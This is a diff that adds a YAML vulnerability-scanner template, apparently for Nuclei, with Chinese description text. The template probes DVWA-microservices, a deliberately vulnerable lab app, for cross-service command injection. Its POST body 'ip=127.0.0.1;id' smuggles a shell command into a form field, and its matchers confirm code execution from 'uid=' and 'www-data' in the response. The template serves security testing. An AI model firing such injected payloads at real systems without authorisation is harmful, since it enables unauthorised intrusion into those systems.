@@ -1,0 +1,38 @@
+id: mscan-command-injection
+
+info:
+  name: DVWA-microservices 跨服务命令注入 (user-api -> vuln-exec)
+  author: pta
+  severity: critical
+  description: |
+    链路: client -> gateway -> user-api(BFF) -> vuln-exec
+
+    vuln-exec 将 `ip` 参数直接拼接到系统命令中执行。user-api 的
+    user_api_validate_input() 不做任何校验, 导致 ";id" 追加命令穿越整个
+    微服务链路并在下游 shell 层执行。响应中出现 `uid=...(www-data)` 即
+    可作为 RCE 佐证。
+  tags: dvwa,rce,command-injection,cross-service,microservice,bff
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/vulnerabilities/exec/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "ip=127.0.0.1;id&Submit=Submit"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\([a-zA-Z0-9_-]+\\)\\s+gid=[0-9]+\\("
+
+      - type: word
+        part: body
+        words:
+          - "www-data"
